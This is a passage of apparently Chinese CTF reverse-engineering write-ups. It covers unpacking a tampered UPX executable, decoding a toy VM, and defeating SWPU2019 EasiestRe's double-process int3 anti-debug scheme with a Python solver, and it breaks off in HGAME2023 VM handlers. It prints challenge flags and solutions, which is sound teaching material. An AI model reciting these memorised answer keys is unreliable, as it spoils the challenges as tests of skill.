90 00 03 00 00 00 04 00 00 00 FF FF 00 00  TG?........</span><br><span class="line">00000010  B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ?......@.......</span><br><span class="line">00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000030  00 00 00 00 00 00 00 00 00 00 00 00 70 00 00 00  ............p...</span><br><span class="line">00000040  0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68  ?.???L?Th</span><br><span class="line">00000050  69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F  is.program.canno</span><br><span class="line">00000060  74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20  t.be.run.in.DOS.</span><br><span class="line">00000070  6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00  mode....$.......</span><br><span class="line">00000080  50 45 00 00 4C 01 03 00 9B 10 21 65 00 BC 04 00  PE..L.?!e.?.</span><br><span class="line">00000090  1A 05 00 00 E0 00 27 01 0B 01 02 21 00 F0 00 00  ..?&#x27;!.?.</span><br><span class="line">000000A0  00 10 00 00 00 90 04 00 20 80 05 00 00 A0 04 00  ....?..€..?.</span><br><span class="line">000000B0  00 90 05 00 00 00 40 00 00 10 00 00 00 02 00 00  .?...@.......</span><br><span class="line">000000C0  04 00 00 00 01 00 00 00 04 00 00 00 00 00 00 00  .............</span><br><span class="line">000000D0  00 A0 05 00 00 10 00 00 00 00 00 00 03 00 00 00  .?...........</span><br><span class="line">000000E0  00 00 20 00 00 10 00 00 00 00 10 00 00 10 00 00  .............</span><br><span class="line">000000F0  00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00  ...............</span><br><span class="line">00000100  EC 94 05 00 B4 00 00 00 00 90 05 00 EC 04 00 00  鞌.?...?.?..</span><br><span class="line">00000110  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000120  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000130  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000140  F0 8B 05 00 18 00 00 00 00 00 00 00 00 00 00 00  饗............</span><br><span class="line">00000150  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000160  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">00000170  00 00 00 00 00 00 00 00 54 55 54 30 00 00 00 00  ........TUT0....</span><br><span class="line">00000180  00 90 04 00 00 10 00 00 00 00 00 00 00 02 00 00  .?...........</span><br><span class="line">00000190  00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 E0  ............€..?</span><br><span class="line">000001A0  54 55 54 31 00 00 00 00 00 F0 00 00 00 A0 04 00  TUT1.....?..?.</span><br><span class="line">000001B0  00 EE 00 00 00 02 00 00 00 00 00 00 00 00 00 00  .?............</span><br><span class="line">000001C0  00 00 00 00 40 00 00 E0 2E 72 73 72 63 00 00 00  ....@..?rsrc...</span><br><span class="line">000001D0  00 10 00 00 00 90 05 00 00 06 00 00 00 F0 00 00  ....?.....?.</span><br><span class="line">000001E0  00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 C0  ............@..?</span><br><span class="line">000001F0  33 2E 39 36 00 54 55 54 21 0D 09 0E 0A CE 64 10  3.96.TUT!...蝑</span><br></pre></td></tr></table></figure><p>除了MZ签名和UPX段的以外 还有PE头偏移也要改(3C处) 改为80<br>upx解就行了<br>然后一个超简单的虚拟机 这种vm…<br>得到字节码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">0 read ---&gt; stack[]</span><br><span class="line">1 mov a1[0] stack[0]</span><br><span class="line">7 xor a1[0] (a1[1]^0x17)</span><br><span class="line">8 mov stack[32] a1[0]</span><br><span class="line">14 mov a1[0] stack[1]</span><br><span class="line">20 xor a1[0] (a1[1]^0x17)</span><br><span class="line">21 mov stack[33] a1[0]</span><br><span class="line">27 mov a1[0] stack[2]</span><br><span class="line">33 xor a1[0] (a1[1]^0x17)</span><br><span class="line">34 mov stack[34] a1[0]</span><br><span class="line">40 mov a1[0] stack[3]</span><br><span class="line">46 xor a1[0] (a1[1]^0x17)</span><br><span class="line">47 mov stack[35] a1[0]</span><br><span class="line">53 mov a1[0] stack[4]</span><br><span class="line">59 xor a1[0] (a1[1]^0x17)</span><br><span class="line">60 mov stack[36] a1[0]</span><br><span class="line">66 mov a1[0] stack[5]</span><br><span class="line">72 xor a1[0] (a1[1]^0x17)</span><br><span class="line">73 mov stack[37] a1[0]</span><br><span class="line">79 mov a1[0] stack[6]</span><br><span class="line">85 xor a1[0] (a1[1]^0x17)</span><br><span class="line">86 mov stack[38] a1[0]</span><br><span class="line">92 mov a1[0] stack[7]</span><br><span class="line">98 xor a1[0] (a1[1]^0x17)</span><br><span class="line">99 mov stack[39] a1[0]</span><br><span class="line">105 mov a1[0] stack[8]</span><br><span class="line">111 xor a1[0] (a1[1]^0x17)</span><br><span class="line">112 mov stack[40] a1[0]</span><br><span class="line">118 mov a1[0] stack[9]</span><br><span class="line">124 xor a1[0] (a1[1]^0x17)</span><br><span class="line">125 mov stack[41] a1[0]</span><br><span class="line">131 mov a1[0] stack[10]</span><br><span class="line">137 xor a1[0] (a1[1]^0x17)</span><br><span class="line">138 mov stack[42] a1[0]</span><br><span class="line">144 mov a1[0] stack[11]</span><br><span class="line">150 xor a1[0] (a1[1]^0x17)</span><br><span class="line">151 mov stack[43] a1[0]</span><br><span class="line">157 mov a1[0] stack[12]</span><br><span class="line">163 xor a1[0] (a1[1]^0x17)</span><br><span class="line">164 mov stack[44] a1[0]</span><br></pre></td></tr></table></figure><p>这… 提取出enc 注意到a1[1]&#x3D;&#x3D;&#x3D;0 所以就一个xor 0x17…<br>得到flag<br><strong>FSCTF{Y0u successfu11y br0k3 my pr0t3ct10n!!!}</strong></p><h1 id="SWPU2019"><a href="#SWPU2019" class="headerlink" title="SWPU2019"></a>SWPU2019</h1><h2 id="EasiestRe"><a href="#EasiestRe" class="headerlink" title="EasiestRe"></a>EasiestRe</h2><p>参考资料:<br><a href="https://bbs.kanxue.com/thread-95082-1.htm" target="_blank">+</a><br><a href="https://www.nssctf.cn/note/set/2071" target="_blank">++</a><br><a href="https://blog.csdn.net/weixin_53349587/article/details/122279966" target="_blank">+++</a></p><p>第一次接触双进程保护的题<br>通过这道题学会了好多好多…</p><p>IDA打开 结合IsDebug…的判断 知道这是一道双进程保护的题目<br>通过判断是否处于调试状态来执行对应操作 这种加上异常处理就可以很好的混淆程序流</p><p>这题的子进程就是sub_403922<br>注意到主进程也就是main的这里:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; <span class="number">35</span> &amp;&amp; (<span class="type">unsigned</span> __int8)Buffer[i] == <span class="number">144</span>; ++i )</span><br></pre></td></tr></table></figure><p>这里是在统计nop个数！<br>也就是根据子进程触发的__int3处的nop数来决定下步操作<br>有4,5,7,30 的情况<br>重点关注7,30 </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                    <span class="built_in">WriteProcessMemory</span>(ProcessInformation.hProcess, lpBaseAddress, v16, <span class="number">7u</span>, NumberOfBytesWritten);</span><br><span class="line">                    <span class="keyword">if</span> ( NumberOfBytesWritten[<span class="number">0</span>] == <span class="number">7</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="built_in">ReadProcessMemory</span>(ProcessInformation.hProcess, lpBaseAddress, Buffer, <span class="number">7u</span>, NumberOfBytesRead);</span><br><span class="line">                      dwContinueStatus = <span class="number">65538</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">30</span>:</span><br><span class="line">                    <span class="built_in">WriteProcessMemory</span>(ProcessInformation.hProcess, lpBaseAddress, v15, <span class="number">0x1E</span>u, NumberOfBytesWritten);</span><br><span class="line">                    <span class="keyword">if</span> ( NumberOfBytesWritten[<span class="number">0</span>] == <span class="number">30</span> )</span><br><span class="line">                      dwContinueStatus = <span class="number">65538</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这里对响应的nop点进行了代码的替换 从write&#x2F;read 操作内存以及v15,v16转成16进制就是响应操作码可知道</p><p>对应7的点在00408AF8处<br>ida_patch替换对应字节后反汇编得到</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> <span class="title">sub_68A40</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1[<span class="number">52</span>]; <span class="comment">// [esp+8h] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2[<span class="number">10</span>]; <span class="comment">// [esp+D8h] [ebp-68h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">56</span>]; <span class="comment">// [esp+100h] [ebp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+138h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">j__memset</span>(Str, <span class="number">0</span>, <span class="number">0x32</span>u);</span><br><span class="line">  v2[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">  v2[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">  v2[<span class="number">2</span>] = <span class="number">7</span>;</span><br><span class="line">  v2[<span class="number">3</span>] = <span class="number">14</span>;</span><br><span class="line">  v2[<span class="number">4</span>] = <span class="number">30</span>;</span><br><span class="line">  v2[<span class="number">5</span>] = <span class="number">57</span>;</span><br><span class="line">  v2[<span class="number">6</span>] = <span class="number">120</span>;</span><br><span class="line">  v2[<span class="number">7</span>] = <span class="number">251</span>;</span><br><span class="line">  <span class="built_in">j__memset</span>(v1, <span class="number">0</span>, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="built_in">sub_61497</span>(<span class="string">&quot;Please Input Flag:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_61956</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  v4 = <span class="built_in">j__strlen</span>(Str);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt;= <span class="number">24</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_6247D</span>(Str, (<span class="type">int</span>)v2, (<span class="type">int</span>)v1);           <span class="comment">// encrypt</span></span><br><span class="line">    <span class="built_in">sub_6384B</span>((<span class="type">int</span>)v1);                         <span class="comment">// check的上面的a3...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_61497</span>(<span class="string">&quot;you are too short!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Orphan comments:</span></span><br><span class="line"><span class="comment">强行debugbreak...</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>在进入sub_6247D后可以找到sub_6460B中对应30nop处<br>同样处理后得到</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> __cdecl <span class="title">sub_687E0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 i; <span class="comment">// [esp+3h] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8u</span>; ++i )</span><br><span class="line">    *(_DWORD *)(a2 + <span class="number">4</span> * i) = <span class="number">41</span> * *(_DWORD *)(a1 + <span class="number">4</span> * i) % <span class="number">491u</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样分析就好分析多了<br>加密函数:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> __cdecl <span class="title">sub_68860</span><span class="params">(<span class="type">char</span> *Str, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// [esp+Fh] [ebp-4Dh]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+10h] [ebp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [esp+10h] [ebp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+14h] [ebp-48h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v8; <span class="comment">// [esp+1Bh] [ebp-41h]</span></span><br><span class="line">  <span class="type">int</span> v9[<span class="number">4</span>]; <span class="comment">// [esp+20h] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10[<span class="number">9</span>]; <span class="comment">// [esp+30h] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+54h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = <span class="number">0x1234</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  v9[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v9[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="built_in">j__strlen</span>(Str);</span><br><span class="line">  <span class="built_in">sub_6460B</span>(a2, (<span class="type">int</span>)v10);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i )</span><br><span class="line">      Str[i] ^= *(_BYTE *)(a3 + <span class="number">4</span> * i - <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      *Str ^= v11;</span><br><span class="line">    v4 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">j__memset</span>(v9, <span class="number">0</span>, <span class="number">8u</span>);</span><br><span class="line">    __debugbreak();</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (v4 &amp; Str[i]) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_BYTE *)v9 + j) = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)j &gt;= <span class="number">8</span> )</span><br><span class="line">          <span class="built_in">j____report_rangecheckfailure</span>();</span><br><span class="line">        *((_BYTE *)v9 + j) = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v4 *= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">8</span>; ++k )</span><br><span class="line">      *(_DWORD *)(a3 + <span class="number">4</span> * i) += v10[<span class="number">7</span> - k] * *((<span class="type">unsigned</span> __int8 *)v9 + k);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的a3初始为空 v10是传入的a2经过线性变换得到<br>流程就是xor后再poly转一下得到a3<br>结束enc后 进入下面的函数 需要在汇编代码中找到check点<br>在loc_6845A可以找到比对字符串 这里有个疑问 不知道为什么要从中间半截开始取…<br>理论可以怼那一大段汇编…<br>好吧 这里能看出来: 简单方法就是找cmp后的jz&#x2F;jnz</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_20]</span><br><span class="line">mov     ecx, [ebp+var_28]</span><br><span class="line">mov     edx, [ebp+var_20]</span><br><span class="line">mov     eax, [ecx+eax*<span class="number">4</span>]</span><br><span class="line">cmp     eax, [ebp+edx*<span class="number">4</span>+var_124]</span><br><span class="line">jnz     <span class="type">short</span> loc_68657</span><br></pre></td></tr></table></figure><p>注意check的是a3的值<br>根据这个逻辑逆回去:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">v2 = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">30</span>,<span class="number">57</span>,<span class="number">120</span>,<span class="number">251</span>]</span><br><span class="line">enc = [<span class="number">0x3d1</span>,<span class="number">0x2f0</span>,<span class="number">0x52</span>,<span class="number">0x475</span>,<span class="number">0x1d2</span>,<span class="number">0x2f0</span>,<span class="number">0x224</span>,<span class="number">0x51c</span>,<span class="number">0x4e6</span>,<span class="number">0x29f</span>,<span class="number">0x2ee</span>,<span class="number">0x39b</span>,<span class="number">0x3f9</span>,<span class="number">0x32b</span>,<span class="number">0x2f2</span>,<span class="number">0x5b5</span>,<span class="number">0x24c</span>,<span class="number">0x45a</span>,<span class="number">0x34c</span>,<span class="number">0x56d</span>,<span class="number">0x0a</span>,<span class="number">0x4e6</span>,<span class="number">0x476</span>,<span class="number">0x2d9</span>]</span><br><span class="line">v10 = [<span class="number">41</span>*x%<span class="number">491</span> <span class="keyword">for</span> x <span class="keyword">in</span> v2]</span><br><span class="line"></span><br><span class="line">a3 = [<span class="number">0</span>]*<span class="number">24</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>&lt;&lt;<span class="number">9</span>):</span><br><span class="line">        s = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(s)&lt;<span class="number">8</span>):</span><br><span class="line">            s = <span class="string">&#x27;0&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(s))+s</span><br><span class="line">        tot = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            tot += <span class="built_in">int</span>(s[j])*v10[j]</span><br><span class="line">        <span class="keyword">if</span>(tot==enc[i]):</span><br><span class="line">            flag.append(x)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>((flag[<span class="number">0</span>]^<span class="number">0x1234</span>)&amp;<span class="number">0xff</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>((flag[i]^enc[i-<span class="number">1</span>])&amp;<span class="number">0xff</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">## swpuctf&#123;y0u_@re_s0_coo1&#125;</span></span><br></pre></td></tr></table></figure><p>flag:<br><strong>swpuctf{y0u_@re_s0_coo1}</strong></p><hr><hr><p>题目本身不是重点 重要的是通过这道题逐步接触了解双进程&#x2F;int3等知识点!</p><h1 id="HGAME2023"><a href="#HGAME2023" class="headerlink" title="HGAME2023"></a>HGAME2023</h1><h2 id="week4-vm"><a href="#week4-vm" class="headerlink" title="week4 vm"></a>week4 vm</h2><p>又是vmopcode 这题在基础的opcode上加入了je&#x2F;jne&#x2F;cmp&#x2F;jmp的跳转<br>需要注意一个点: jmp跳转后pc不重置为opcode[pc+1] 我们是继续打印后面的指令<br>我们打印完bytecode自己分析时再考虑跳转</p><p>每个函数:<br>F0</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">F0</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v2 = OPCODE[a1[<span class="number">6</span>] + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v2 )                                     <span class="comment">// a1[]当作寄存器</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        INPUT[a1[<span class="number">2</span>]] = *a1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        a1[OPCODE[a1[<span class="number">6</span>] + <span class="number">2</span>]] = a1[OPCODE[a1[<span class="number">6</span>] + <span class="number">3</span>]];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        a1[OPCODE[a1[<span class="number">6</span>] + <span class="number">2</span>]] = OPCODE[a1[<span class="number">6</span>] + <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a1 = INPUT[a1[<span class="number">2</span>]];</span><br><span class="line">  &#125;</span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)(a1[<span class="number">6</span>] + <span class="number">4</span>);</span><br><span class="line">  a1[<span class="number">6</span>] = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>F1:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">F1</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v2 = OPCODE[a1[<span class="number">6</span>] + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v2 )                               <span class="comment">// 入栈</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        tmp[++a1[<span class="number">7</span>]] = *a1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        tmp[++a1[<span class="number">7</span>]] = a1[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        tmp[++a1[<span class="number">7</span>]] = a1[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    tmp[++a1[<span class="number">7</span>]] = *a1;</span><br><span class="line">  &#125;</span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)(a1[<span class="number">6</span>] + <span class="number">2</span>);</span><br><span class="line">  a1[<span class="number">6</span>] = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>F2:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 